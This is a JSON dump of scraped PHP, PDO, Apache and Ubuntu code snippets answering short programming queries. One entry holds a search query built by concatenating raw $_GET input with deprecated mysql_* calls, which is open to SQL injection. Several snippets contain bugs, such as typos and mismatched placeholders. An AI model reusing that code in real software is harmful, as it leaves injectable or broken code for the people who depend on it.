    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {     $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);     // set the PDO error mode to exception     $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);     echo \"Connected successfully\";     } catch(PDOException $e)     {     echo \"Connection failed: \" . $e->getMessage();     } ?>\n<?php class database{   private $host = \"localhost\";   private $db_name = \"php_basic\";   private $username = \"root\";   private $password = \"\";   private $conn;    // connect database using PDO   function connect_pdo(){     try{       $this->conn = new PDO(\"mysql:host=\".$this->host.\";dbname=\".$this->db_name, $this->username, $this->password);       return $this->conn;     }     catch(PDOException $ex){       echo \"Connection Error -->> \",$ex->getMessage();       echo \"<br>Error Code -->> \",$ex->getCode();       echo \"<br>Error occur in File -->> \",$ex->getFile();       echo \"<br>Error occur on Line no -->> \",$ex->getLine();        $this->conn = null; // close connection in PDO     }   } } ?>    //how to use  <?php include 'connect_db.php'; $database=new database(); $db = $database->connect_pdo(); ?>\n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {   $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);   // set the PDO error mode to exception   $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);   echo \"Connected successfully\"; } catch(PDOException $e) {   echo \"Connection failed: \" . $e->getMessage(); } ?>\n<?php $db = new PDO('mysql:host=myhost;dbname=mydb', 'login', 'password');   \n<?php $pdo = new PDO('mysql:host=localhost;dbname=databasename', 'username', 'password'); ?> \n$db = new PDO(\"sqlsrv:Server=YouAddress;Database=YourDatabase\", \"Username\", \"Password\"); \n",
    "reg_date": "2021-10-12T10:17:18.000Z"
  },
  {
    "id": 3039,
    "keyword": null,
    "link": null,
    "title": " pdo fetch",
    "description": " <?php $sth = $dbh->prepare(\"SELECT name, colour FROM fruit\"); $sth->execute();  /* Exercise PDOStatement::fetch styles */ print(\"PDO::FETCH_ASSOC: \"); print(\"Return next row as an array indexed by column name\\n\"); $result = $sth->fetch(PDO::FETCH_ASSOC); print_r($result); print(\"\\n\");  print(\"PDO::FETCH_BOTH: \"); print(\"Return next row as an array indexed by both column name and number\\n\"); $result = $sth->fetch(PDO::FETCH_BOTH); print_r($result); print(\"\\n\");  print(\"PDO::FETCH_LAZY: \"); print(\"Return next row as an anonymous object with column names as properties\\n\"); $result = $sth->fetch(PDO::FETCH_LAZY); print_r($result); print(\"\\n\");  print(\"PDO::FETCH_OBJ: \"); print(\"Return next row as an anonymous object with column names as properties\\n\"); $result = $sth->fetch(PDO::FETCH_OBJ); print $result->name; print(\"\\n\"); ?>  \n It should be mentioned that this method can set even non-public properties. It may sound strange but it can actually be very useful when creating an object based on mysql result. Consider a User class:  <?php class User {    // Private properties    private $id, $name;     private function __construct () {}     public static function load_by_id ($id) {       $stmt = $pdo->prepare('SELECT id, name FROM users WHERE id=?');       $stmt->execute([$id]);       return $stmt->fetchObject(__CLASS__);    }    /* same method can be written with the \"name\" column/property */ }  $user = User::load_by_id(1); var_dump($user); ?>  fetchObject() doesn't care about properties being public or not. It just passes the result to the object. Output is like:  object(User)#3 (2) {   [\"id\":\"User\":private]=>   string(1) \"1\"   [\"name\":\"User\":private]=>   string(10) \"John Smith\" } \n while ($row = mysqli_fetch_assoc( $result)) {}\n$dbhost = @mysql_connect($host, $user, $pass) or die('Unable to connect to server');  @mysql_select_db('divebay') or die('Unable to select database'); $search = $_GET['searchdivebay']; $query = trim($search);  $sql = \"SELECT * FROM auction WHERE name LIKE '%\" . $query . \"%'\";    if(!isset($query)){ echo 'Your search was invalid'; exit; } //line 18  $result = mysql_query($trim); $numrows = mysql_num_rows($result); mysql_close($dbhost);\n$pdo = new PDO('mysql:host=$host; dbname=$database;', $user, $pass); $stmt = $pdo->prepare('SELECT * FROM auction WHERE name = :name'); $stmt->bindParam(':name', $_GET['searchdivebay']); $stmt->execute(array(':name' => $name);\n$stmt = $pdo->prepare(\"SELECT * FROM users LIMIT :limit, :offset\");$stmt->execute(['limit' => $limit, 'offset' => $offset]); $data = $stmt->fetchAll();// and somewhere later:foreach ($data as $row) {    echo $row['name'].\"<br />\\n\";}\n",
    "reg_date": "2021-10-12T10:17:18.000Z"
  },
  {
    "id": 3040,
    "keyword": null,
    "link": null,
    "title": " pdo last id",
    "description": "$stmt = $db->prepare(\"...\"); $stmt->execute(); $id = $db->lastInsertId();\n Beware of lastInsertId() when working with transactions in mysql. The following code returns 0 instead of the insert id.    <?php  try {      $dbh = new PDO('mysql:host=localhost;dbname=test', 'username', 'password');        $stmt = $dbh->prepare(\"INSERT INTO test (name, email) VALUES(?,?)\");        try {          $dbh->beginTransaction();          $tmt->execute( array('user', 'user@example.com'));          $dbh->commit();          print $dbh->lastInsertId();      } catch(PDOExecption $e) {          $dbh->rollback();          print \"Error!: \" . $e->getMessage() . \"</br>\";      }  } catch( PDOExecption $e ) {      print \"Error!: \" . $e->getMessage() . \"</br>\";  }  ?>    When no exception is thrown, lastInsertId returns 0. However, if lastInsertId is called before calling commit, the right id is returned. \n$(document).ready(function(){ $.ajax({ url: \"database/update.html\",         context: document.body,         success: function(){            alert(\"done\");         }}); }); \n",
    "reg_date": "2021-10-12T10:17:19.000Z"
  },
  {
    "id": 3041,
    "keyword": null,
    "link": null,
    "title": " pdo php search table",
    "description": "$search_keyword = ''; if(!empty($_POST['search']['keyword'])) { \t$search_keyword = $_POST['search']['keyword']; } $sql = 'SELECT * FROM posts WHERE post_title LIKE :keyword OR description LIKE :keyword OR post_at LIKE :keyword ORDER BY id DESC '; ... ... $pdo_statement = $pdo_conn->prepare($query); $pdo_statement->bindValue(':keyword', '%' . $search_keyword . '%', PDO::PARAM_STR); $pdo_statement->execute(); $result = $pdo_statement->fetchAll();\n<?php $sth = $dbh->prepare(\"SELECT name, colour FROM fruit\"); $sth->execute();  /* Fetch all of the remaining rows in the result set */ print(\"Fetch all of the remaining rows in the result set:\\n\"); $result = $sth->fetchAll(\\PDO::FETCH_ASSOC); print_r($result);  //Results:  Array (     [0] => Array         (             [NAME] => pear             [COLOUR] => green         )      [1] => Array         (             [NAME] => watermelon             [COLOUR] => pink         ) )   ?>\n",
    "reg_date": "2021-10-12T10:17:19.000Z"
  },
  {
    "id": 3042,
    "keyword": null,
    "link": null,
    "title": " pdo prepare",
    "description": " <?php /* Execute a prepared statement by passing an array of values */ $sql = 'SELECT name, colour, calories     FROM fruit     WHERE calories < :calories AND colour = :colour'; $sth = $dbh->prepare($sql, array(PDO::ATTR_CURSOR => PDO::CURSOR_FWDONLY)); $sth->execute(array(':calories' => 150, ':colour' => 'red')); $red = $sth->fetchAll(); $sth->execute(array(':calories' => 175, ':colour' => 'yellow')); $yellow = $sth->fetchAll(); ?>  \n <?php /* Ex&eacute;cute une requ&ecirc;te pr&eacute;par&eacute;e en passant un tableau de valeurs */ $sql = 'SELECT nom, couleur, calories     FROM fruit WHERE calories < :calories AND couleur = :couleur'; $sth = $dbh->prepare($sql, array(PDO::ATTR_CURSOR => PDO::CURSOR_FWDONLY)); $sth->execute(array(':calories' => 150, ':couleur' => 'red')); $red = $sth->fetchAll(); $sth->execute(array(':calories' => 175, ':couleur' => 'yellow')); $yellow = $sth->fetchAll(); ?>  \n",
    "reg_date": "2021-10-12T10:17:19.000Z"
  },
  {
    "id": 3043,
    "keyword": null,
    "link": null,
    "title": " pdo transaction",
    "description": "<?php /* Begin a transaction, turning off autocommit */ $dbh->beginTransaction();  try\t{ \t/* Change the database schema and data */     $sth = $dbh->exec(\"DROP TABLE fruit\");     $sth = $dbh->exec(\"UPDATE dessert         SET name = 'hamburger'\"); } catch(Exception $e){   /* Recognize mistake and roll back changes */   $dbh->rollBack(); } /* Commit changes */ $dbh->commit();\n$pdo = new PDO(     $dsn,      $username,      $password,      array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION) );  try {     $statement = $pdo->prepare(\"UPDATE user SET name = :name\");      $pdo->beginTransaction();      $statement->execute([\"name\"=>'Bob']);     $statement->execute([\"name\"=>'Joe']);      $pdo->commit(); }  catch (\\Exception $e) {     if ($pdo->inTransaction()) {         $pdo->rollback();         // If we got here our two data updates are not in the database     }     throw $e; } \n// In this example we are using MySQL but this applies to any database that has support for transactions $db = new PDO('mysql:host=' . $host . ';dbname=' . $dbname . ';charset=utf8', $username, $password);      // Make sure that PDO will throw an exception in case of error to make error handling easier $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);  try {     // From this point and until the transaction is being committed every change to the database can be reverted     $db->beginTransaction();              // Insert the metadata of the order into the database     $preparedStatement = $db->prepare(         'INSERT INTO `orders` (`order_id`, `name`, `address`, `created_at`)          VALUES (:name, :address, :telephone, :created_at)'     );          $preparedStatement->execute([         'name' => $name,         'address' => $address,         'telephone' => $telephone,         'created_at' => time(),     ]);          // Get the generated `order_id`     $orderId = $db->lastInsertId();      // Construct the query for inserting the products of the order     $insertProductsQuery = 'INSERT INTO `orders_products` (`order_id`, `product_id`, `quantity`) VALUES';          $count = 0;     foreach ( $products as $productId => $quantity ) {         $insertProductsQuery .= ' (:order_id' . $count . ', :product_id' . $count . ', :quantity' . $count . ')';                  $insertProductsParams['order_id' . $count] = $orderId;         $insertProductsParams['product_id' . $count] = $productId;         $insertProductsParams['quantity' . $count] = $quantity;                  ++$count;     }          // Insert the products included in the order into the database     $preparedStatement = $db->prepare($insertProductsQuery);     $preparedStatement->execute($insertProductsParams);          // Make the changes to the database permanent     $db->commit(); } catch ( PDOException $e ) {      // Failed to insert the order into the database so we rollback any changes     $db->rollback();     throw $e; } \n",
    "reg_date": "2021-10-12T10:17:19.000Z"
  },
  {
    "id": 3044,
    "keyword": null,
    "link": null,
    "title": " pdo turn on errors",
    "description": "$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); \n",
    "reg_date": "2021-10-12T10:17:19.000Z"
  },
  {
    "id": 3045,
    "keyword": null,
    "link": null,
    "title": " pegar parte da string php",
    "description": " <?php $rest = substr(\"abcdef\", -1);    // retorna \"f\" $rest = substr(\"abcdef\", -2);    // retorna \"ef\" $rest = substr(\"abcdef\", -3, 1); // retorna \"d\" ?>  \n",
    "reg_date": "2021-10-12T10:17:19.000Z"
  },
  {
    "id": 3046,
    "keyword": null,
    "link": null,
    "title": " permissions on ssh",
    "description": "  Typically you want the permissions to be:      .ssh directory: 700 (drwx------)     public key (.pub file): 644 (-rw-r--r--)     private key (id_rsa): 600 (-rw-------)     lastly your home directory should not be writeable by the group or others (at most 755 (drwxr-xr-x)).  I am assuming that you mean that you have to enter your system/user password each time, and that previously you did not have to. cdhowie's response is assuming you set a password/passphrase when generating your keys, and if you did then as he says you will have to enter your password every time unless you use an ssh agent.  \n",
    "reg_date": "2021-10-12T10:17:19.000Z"
  },
  {
    "id": 3047,
    "keyword": null,
    "link": null,
    "title": " persian error laravel",
    "description": "1 ) go to this link    ( https://github.com/mojtabaRKS/laravel-persian-validation)   2 )    and download the file  3 ) and save it in this route     ( laravelProject\\resources\\lang )          4 )    now go to this route ( config\\app.php )  5 )  and find the 'locale' => 'en' 6 )    and change it to this :  'locale' => 'fa'\n",
    "reg_date": "2021-10-12T10:17:19.000Z"
  },
  {
    "id": 3048,
    "keyword": null,
    "link": null,
    "title": " php.ini location",
    "description": "php --ini\nrun: php --ini\ncreate a php file with this code  <?php phpinfo(); ?>  and php.ini file's location + others details will be available when  you'll browse the file with a web browser.\n",
    "reg_date": "2021-10-12T10:17:19.000Z"
  },
  {
    "id": 3049,
    "keyword": null,
    "link": null,
    "title": " php.ini settings",
    "description": "/usr/local/etc/php/7.3/php.ini    max_execution_time = 3600 max_input_time = 3600 max_input_vars = 10000 memory_limit = 1024M post_max_size = 1024M upload_max_filesize = 1024M max_file_uploads = 200 short_open_tag = On\n",
    "reg_date": "2021-10-12T10:17:20.000Z"
  },
  {
    "id": 3050,
    "keyword": null,
    "link": null,
    "title": " php.ini upload image size",
    "description": "##put these directives in a php.ini file in the root of files upload_max_filesize = 10M post_max_size = 10M\n",
    "reg_date": "2021-10-12T10:17:20.000Z"
  },
  {
    "id": 3051,
    "keyword": null,
    "link": null,
    "title": " php",
    "description": "dont use php\necho \"Hello World\";\n<?php class BaseClass {    public function test() {        echo \"BaseClass::test() called\\n\";    }        final public function moreTesting() {        echo \"BaseClass::moreTesting() called\\n\";    } }  class ChildClass extends BaseClass {    public function moreTesting() {        echo \"ChildClass::moreTesting() called\\n\";    } } // Results in Fatal error: Cannot override final method BaseClass::moreTesting() ?>\n<?php class Connection {     protected $link;     private $dsn, $username, $password;          public function __construct($dsn, $username, $password)     {         $this->dsn = $dsn;         $this->username = $username;         $this->password = $password;         $this->connect();     }          private function connect()     {         $this->link = new PDO($this->dsn, $this->username, $this->password);     }          public function __sleep()     {         return array('dsn', 'username', 'password');     }          public function __wakeup()     {         $this->connect();     } }?>\n<?php class PropertyTest {     /**  Location for overloaded data.  */     private $data = array();      /**  Overloading not used on declared properties.  */     public $declared = 1;      /**  Overloading only used on this when accessed outside the class.  */     private $hidden = 2;      public function __set($name, $value)     {         echo \"Setting '$name' to '$value'\\n\";         $this->data[$name] = $value;     }      public function __get($name)     {         echo \"Getting '$name'\\n\";         if (array_key_exists($name, $this->data)) {             return $this->data[$name];         }          $trace = debug_backtrace();         trigger_error(             'Undefined property via __get(): ' . $name .             ' in ' . $trace[0]['file'] .             ' on line ' . $trace[0]['line'],             E_USER_NOTICE);         return null;     }      /**  As of PHP 5.1.0  */     public function __isset($name)     {         echo \"Is '$name' set?\\n\";         return isset($this->data[$name]);     }      /**  As of PHP 5.1.0  */     public function __unset($name)     {         echo \"Unsetting '$name'\\n\";         unset($this->data[$name]);     }      /**  Not a magic method, just here for example.  */     public function getHidden()     {         return $this->hidden;     } }   echo \"<pre>\\n\";  $obj = new PropertyTest;  $obj->a = 1; echo $obj->a . \"\\n\\n\";  var_dump(isset($obj->a)); unset($obj->a); var_dump(isset($obj->a)); echo \"\\n\";  echo $obj->declared . \"\\n\\n\";  echo \"Let's experiment with the private property named 'hidden':\\n\"; echo \"Privates are visible inside the class, so __get() not used...\\n\"; echo $obj->getHidden() . \"\\n\"; echo \"Privates not visible outside of class, so __get() is used...\\n\"; echo $obj->hidden . \"\\n\"; ?>\n<?php  echo \"Hello, World!\";  ?>\n<?php echo \"Hello World\"; ?>\nprint_r(array_filter($array, function($v) { return !is_null($v); })); \nHTTP/1.1 200 OK Content-Type: text/xml; charset=utf-8 Content-Length: length  <?xml version=\"1.0\" encoding=\"utf-8\"?> <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">   <soap:Body>     <GetOrdersResponse xmlns=\"XmlServices\">       <GetOrdersResult>         <Status>           <Success>boolean</Success>           <WarningMsg>string</WarningMsg>           <ErrorMsg>string</ErrorMsg>           <ErrorId>int</ErrorId>           <TimeStamp>dateTime</TimeStamp>         </Status>         <Orders>           <Order>             <Id>int</Id>             <HotelId>int</HotelId>             <PartnerId>int</PartnerId>             <PartnerName>string</PartnerName>             <Code>string</Code>             <OrderDate>dateTime</OrderDate>             <Arrival>dateTime</Arrival>             <Departure>dateTime</Departure>             <CustomerFirstName>string</CustomerFirstName>             <CustomerName>string</CustomerName>             <CustomerCountryCode>string</CustomerCountryCode>             <CustomerAddress>string</CustomerAddress>             <CustomerCity>string</CustomerCity>             <CustomerZip>string</CustomerZip>             <CustomerEmail>string</CustomerEmail>             <CustomerPhone>string</CustomerPhone>             <CustomerComments>string</CustomerComments>             <ExtraInfo>string</ExtraInfo>             <CommissionInfo>string</CommissionInfo>             <CancellationPolicy>string</CancellationPolicy>             <ccType>string</ccType>             <ccNumber>string</ccNumber>             <ccExpireDate>dateTime</ccExpireDate>             <ccCVV>string</ccCVV>             <ccHolderName>string</ccHolderName>             <TotalPrice>decimal</TotalPrice>             <Currency>string</Currency>             <PaymentType>Unspecified or DirectPayment or Prepayment or PartPayment</PaymentType>             <Status>NotGuaranted or Submitted or Confirmed or Cancelled or CustomChargeFailed or Modified or Avans</Status>             <LastStatusChanged>dateTime</LastStatusChanged>             <Rooms xsi:nil=\"true\" />             <AddOns xsi:nil=\"true\" />             <NumAdults>int</NumAdults>           </Order>           <Order>             <Id>int</Id>             <HotelId>int</HotelId>             <PartnerId>int</PartnerId>             <PartnerName>string</PartnerName>             <Code>string</Code>             <OrderDate>dateTime</OrderDate>             <Arrival>dateTime</Arrival>             <Departure>dateTime</Departure>             <CustomerFirstName>string</CustomerFirstName>             <CustomerName>string</CustomerName>             <CustomerCountryCode>string</CustomerCountryCode>             <CustomerAddress>string</CustomerAddress>             <CustomerCity>string</CustomerCity>             <CustomerZip>string</CustomerZip>             <CustomerEmail>string</CustomerEmail>             <CustomerPhone>string</CustomerPhone>             <CustomerComments>string</CustomerComments>             <ExtraInfo>string</ExtraInfo>             <CommissionInfo>string</CommissionInfo>             <CancellationPolicy>string</CancellationPolicy>             <ccType>string</ccType>             <ccNumber>string</ccNumber>             <ccExpireDate>dateTime</ccExpireDate>             <ccCVV>string</ccCVV>             <ccHolderName>string</ccHolderName>             <TotalPrice>decimal</TotalPrice>             <Currency>string</Currency>             <PaymentType>Unspecified or DirectPayment or Prepayment or PartPayment</PaymentType>             <Status>NotGuaranted or Submitted or Confirmed or Cancelled or CustomChargeFailed or Modified or Avans</Status>             <LastStatusChanged>dateTime</LastStatusChanged>             <Rooms xsi:nil=\"true\" />             <AddOns xsi:nil=\"true\" />             <NumAdults>int</NumAdults>           </Order>         </Orders>       </GetOrdersResult>     </GetOrdersResponse>   </soap:Body> </soap:Envelope>\nPHP is a general-purpose scripting language especially suited to web development.  It was originally created by Danish-Canadian programmer  Rasmus Lerdorf in 1994;  the PHP reference implementation is now produced by The PHP Group  Implementation language: C (primarily; some components C++) \n",
    "reg_date": "2021-10-12T10:17:20.000Z"
  },
  {
    "id": 3052,
    "keyword": null,
    "link": null,
    "title": " php.validate.executablePath",
    "description": "/* File->Preferences->settings->User settings tab->extensions->from the drop down select php->on the right pane under PHP &rsaquo; Validate: Executable Path select edit in settings.json.  Then set the path as your case may be e.g for a xamp user who installed xammp on c drive you will have: */ \"php.validate.executablePath\": \"c:\\\\xampp\\\\php\\\\php.exe\"  /*  If php is installed in your system independently or by other means simply set the path of your php.exe file like below: */ \"php.validate.executablePath\": \"C://path.to.your.php.folder//php.exe\"\n{   \"php.validate.executablePath\": \"c:/php/php.exe\" }\n",
    "reg_date": "2021-10-12T10:17:20.000Z"
  },
  {
    "id": 3053,
    "keyword": null,
    "link": null,
    "title": " php != operator",
    "description": "$a == $b\tEqual\tTRUE if $a is equal to $b after type juggling. $a === $b\tIdentical\tTRUE if $a is equal to $b, and they are of the same type. $a != $b\tNot equal\tTRUE if $a is not equal to $b after type juggling. $a <> $b\tNot equal\tTRUE if $a is not equal to $b after type juggling. $a !== $b\tNot identical\tTRUE if $a is not equal to $b, or they are not of the same type. $a < $b\tLess than\tTRUE if $a is strictly less than $b. $a > $b\tGreater than\tTRUE if $a is strictly greater than $b. $a <= $b\tLess than or equal to\tTRUE if $a is less than or equal to $b. $a >= $b\tGreater than or equal to\tTRUE if $a is greater than or equal to $b. $a <=> $b\tSpaceship\tAn integer less than, equal to, or greater than zero when $a is less than, equal to, or greater than $b, respectively. Available as of PHP 7.\n$x = expr1 ?? expr2\tNull coalescing return expr1 if not null or available \n<?php var_dump(null ?? '`null` is null'); // `null` is null var_dump(null ?: '`null` is empty'); // null var_dump(true ?? '`true` is null'); // true var_dump(true ?: '`true` is empty'); // true var_dump(false ?? '`false` is null'); // false var_dump(false ?: '`false` is empty'); // `false` is empty\" var_dump('' ?? 'empty string is null'); // \"\" var_dump('' ?: 'empty string is empty'); // \"empty string is empty\" var_dump(empty(null) ?: '`null` is not empty'); // true\n// Example usage for: Ternary Operator $action = $_POST['action'] ?: 'default';  // The above is identical to this if/else statement if (empty($_POST['action'])) {     $action = 'default'; } else {     $action = $_POST['action']; }\n",
    "reg_date": "2021-10-12T10:17:20.000Z"
  },
  {
    "id": 3054,
    "keyword": null,
    "link": null,
    "title": " php & before variable",
    "description": "It passes a reference to the variable so when any variable assigned the reference  is edited, the original variable is changed. They are really useful when making  functions which update an existing variable. Instead of hard coding which variable  is updated, you can simply pass a reference to the function instead.  Example  <?php     $number = 3;     $pointer = &$number;  // Sets $pointer to a reference to $number     echo $number.\"<br/>\"; // Outputs  '3' and a line break     $pointer = 24;        // Sets $number to 24     echo $number;         // Outputs '24' ?> \n",
    "reg_date": "2021-10-12T10:17:20.000Z"
  },
  {
    "id": 3055,
    "keyword": null,
    "link": null,
    "title": " php ??",
    "description": "Q: What is PHP?    A: PHP is a general-purpose scripting for the scripting of web developments. It was originally produced in 1994 by Rasmus Lerdorf, a Danish Canadian programmer. The PHP Group is now producing the PHP reference implementation. PHP used to stand for Personal Home Page, now it stands for Hypertext Preprocessor.    Implementation language: C (primarily; some components C++) Stable release: 8.0.2 / 4 February 2021; 4 days ago Developer: The PHP Development Team, Zend Technologies Typing discipline: Dynamic, weak since version 7.0: Gradual Designed by: Rasmus Lerdorf Memory limit: 128 megabytes\n// Example usage for: Null Coalesce Operator $action = $_POST['action'] ?? 'default';  // The above is identical to this if/else statement if (isset($_POST['action'])) {     $action = $_POST['action']; } else {     $action = 'default'; }\n<?php  echo \"Hello, World!\";  ?>\nPHP is a scripting language normally used by web developers to build websites. It supports object oriented programming. It even has support for building windows desktop applications with PHP Desktop\nPHP is a server side scripting language. It is open source. It is embedded language. \nPHP stands for Hypertext Preprocessor.  It is an open source server-side scripting language which is widely used for web development. It supports many databases like MySQL, Oracle, Sybase, Solid, PostgreSQL, generic ODBC etc.\n",
    "reg_date": "2021-10-12T10:17:20.000Z"
  },
  {
    "id": 3056,
    "keyword": null,
    "link": null,
    "title": " php 0 padding left",
    "description": " <?php $input = \"Alien\"; echo str_pad($input, 10);                      // produces \"Alien     \" echo str_pad($input, 10, \"-=\", STR_PAD_LEFT);  // produces \"-=-=-Alien\" echo str_pad($input, 10, \"_\", STR_PAD_BOTH);   // produces \"__Alien___\" echo str_pad($input,  6, \"___\");               // produces \"Alien_\" echo str_pad($input,  3, \"*\");                 // produces \"Alien\" ?>  \n",
    "reg_date": "2021-10-12T10:17:20.000Z"
  },
  {
    "id": 3057,
    "keyword": null,
    "link": null,
    "title": " php 2 decimal places without rounding",
    "description": "<?php  function cutAfterDot($number, $afterDot = 2){ $a = $number * pow(10, $afterDot); $b = floor($a); $c = pow(10, $afterDot); echo \"a $a, b $b, c $c<br/>\"; return $b/$c ; } echo cutAfterDot(2.05,2);  /* output =   a 205, b 204, c 100  2.04 */  ?>\nfunction cutNum($num, $precision = 2) {     return floor($num) . substr(str_replace(floor($num), '', $num), 0, $precision + 1); }\n",
    "reg_date": "2021-10-12T10:17:20.000Z"
  },
  {
    "id": 3058,
    "keyword": null,
    "link": null,
    "title": " php 301 redirect",
    "description": "<?php // Permanent 301 Redirect via PHP \theader(\"HTTP/1.1 301 Moved Permanently\"); \theader(\"Location: http://domain.tld/new/location/\"); \texit(); ?>\n#For apache .htaccess RewriteEngine On RewriteCond %{HTTPS} off RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n301, \"Moved Permanently\"&mdash;recommended for SEO 302, \"Found\" or \"Moved Temporarily\" Meta Refresh \n#In .htaccess    Redirect 301 /old-page https://www.example.com/new-page \n#http to https and www to non-www RewriteEngine On RewriteCond %{HTTPS} off [OR] RewriteCond %{HTTP_HOST} ^www\\. [NC] RewriteCond %{HTTP_HOST} ^(?:www\\.)?(.+)$ [NC] RewriteRule ^ https://%1%{REQUEST_URI} [L,NE,R=301]\n",
    "reg_date": "2021-10-12T10:17:20.000Z"
  },
  {
    "id": 3059,
    "keyword": null,
    "link": null,
    "title": " php 3 digit decimal",
    "description": "return number_format((float)$number, 2, '.', ''); \necho round(520.34345, 2);   // 520.34 echo round(520.3, 2);       // 520.3 echo round(520, 2);         // 520 \n",
    "reg_date": "2021-10-12T10:17:21.000Z"
  },
  {
    "id": 3060,
    "keyword": null,
    "link": null,
    "title": " php 7.4 extension sqlite ubuntu",
    "description": "sudo apt-get install php7.4-cli php7.4-fpm php7.4-bcmath php7.4-curl php7.4-gd php7.4-intl php7.4-json php7.4-mbstring php7.4-mysql php7.4-opcache php7.4-sqlite3 php7.4-xml php7.4-zip \n",
    "reg_date": "2021-10-12T10:17:21.000Z"
  },
  {
    "id": 3061,
    "keyword": null,
    "link": null,
    "title": " php 7.4 modules list",
    "description": "apt install php7.4-{bcmath,bz2,imap,intl,mbstring,soap,sybase,xsl,zip}\n",
    "reg_date": "2021-10-12T10:17:21.000Z"
  },
  {
    "id": 3062,
    "keyword": null,
    "link": null,
    "title": " php 7 count result in database",
    "description": "mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT); $link = mysqli_connect(\"host\", \"username\", \"password\",\"db_name\"); mysqli_set_charset($link, \"utf8mb4\");  $result = mysqli_query($link, \"SELECT count(*) FROM blackandwhite\"); $num_rows = mysqli_fetch_row($result)[0];  echo \"$num_rows Rows\\n\"; \nPHP Count result\n",
    "reg_date": "2021-10-12T10:17:21.000Z"
  },
  {
    "id": 3063,
    "keyword": null,
    "link": null,
    "title": " php 7 strict mode",
    "description": "<?php declare(strict_types = 1);\n",
    "reg_date": "2021-10-12T10:17:21.000Z"
  },
  {
    "id": 3064,
    "keyword": null,
    "link": null,
    "title": " php 7 to  php 8 in ubuntu 20.04",
    "description": "sudo apt update sudo apt install php7.4 sudo apt install php7.4-common php7.4-mysql php7.4-xml php7.4-xmlrpc php7.4-curl php7.4-gd php7.4-imagick php7.4-cli php7.4-dev php7.4-imap php7.4-mbstring php7.4-opcache php7.4-soap php7.4-zip php7.4-intl -y\nsudo apt install software-properties-common sudo add-apt-repository ppa:ondrej/php  sudo apt update  sudo apt install -y php7.4\nsudo apt install software-properties-common sudo add-apt-repository ppa:ondrej/php sudo apt update sudo apt install php8.0  #install common extension  sudo apt install php8.0-common php8.0-mysql php8.0-xml php8.0-xmlrpc php8.0-curl php8.0-gd php8.0-imagick php8.0-cli php8.0-dev php8.0-imap php8.0-mbstring php8.0-opcache php8.0-soap php8.0-zip php8.0-intl -y   sudo a2dismod php7.0   sudo a2dismod php7.1   sudo a2dismod php7.2   sudo a2dismod php7.3   sudo a2dismod php7.4 sudo a2enmod php8.0 sudo service apache2 restart\n",
    "reg_date": "2021-10-12T10:17:21.000Z"
  },
  {
    "id": 3065,
    "keyword": null,
    "link": null,
    "title": " php 8.1 release date",
    "description": "Version\t| Release date\t   | Supported until 7.3\t    |  6 December 2018 | 6 December 2021 7.4\t    | 28 November 2019 | 28 November 2022 8.0\t    | 26 November 2020 | 26 November 2023 8.1\t    | 25 November 2021 | ?? November 2024\n",
    "reg_date": "2021-10-12T10:17:21.000Z"
  },
  {
    "id": 3066,
    "keyword": null,
    "link": null,
    "title": " php 8",
    "description": "latest version of php. see new features at https://php.watch/versions/8.0\n// php 8 Union type class Number {   public function __construct(     private int|float $number   ) {} }  new Number('NaN'); // TypeError  \npub   4096R/70D12172 2017-04-14 [expires: 2024-04-21]       Key fingerprint = 1729 F839 38DA 44E2 7BA0  F4D3 DBDB 3974 70D1 2172 uid                  Sara Golemon <pollita@php.net>  pub   rsa4096 2020-05-09 [SC] [expires: 2024-05-08]       BFDD D286 4282 4F81 18EF  7790 9B67 A5C1 2229 118F uid           [ultimate] Gabriel Caruso (Release Manager) <carusogabriel@php.net> sub   rsa4096 2020-05-09 [E] [expires: 2024-05-08]   \n<?= is a shorthand for <?php echo $a; ?>\n",
    "reg_date": "2021-10-12T10:17:21.000Z"
  },
  {
    "id": 3067,
    "keyword": null,
    "link": null,
    "title": " php 8 attributes",
    "description": "      /*       in MyClassContainingAttributesOnMethods:       */       class MyClassContainingAttributesOnMethods       {       \t#[MyAttribute] \t\t#[MyOtherAttribute(\"someArgument\", 1234, \"someOtherArguments\")] \t\tpublic function someFunction() {...}        }              /*       in MyOtherAttribute:       */ \t  #[Attribute]       class MyOtherAttribute       {         \tpublic function __construct(string $arg1, int $arg2, string $arg3) {...}       }        \t  /*       In app:       */        $reflectionClass = new ReflectionClass(MyClassContainingAttributesOnMethods::class);          foreach($reflectionClass->getMethods() as $method) {             $attributes = $method->getAttributes(MyAttribute::class);             if(count($attributes) == 1) {                 $method = MyClassContainingAttributesOnMethods::class.\"::\".$method->getName();                 $arguments = [];                 foreach($method->getAttributes(MyOtherAttribute::class) as $otherArgument) {                     $otherArg = $otherArgument->newInstance();                     $arguments[$otherArg->argument] = self::require($otherArgument->serviceId);                 }                  $result = $method(...$arguments);             }         } \n",
    "reg_date": "2021-10-12T10:17:21.000Z"
  },
  {
    "id": 3068,
    "keyword": null,
    "link": null,
    "title": " php 8 constructor",
    "description": "class Point {   public function __construct(     public float $x = 0.0,     public float $y = 0.0,     public float $z = 0.0,   ) {} }\n__construct ([ mixed $args = \"\" [, $... ]] ) : void\n    public function __construct(         public string $myProperty,         public string $myOtherProperty,     ) {}\n",
    "reg_date": "2021-10-12T10:17:22.000Z"
  },
  {
    "id": 3069,
    "keyword": null,
    "link": null,
    "title": " php Access-Control-Allow-Origin",
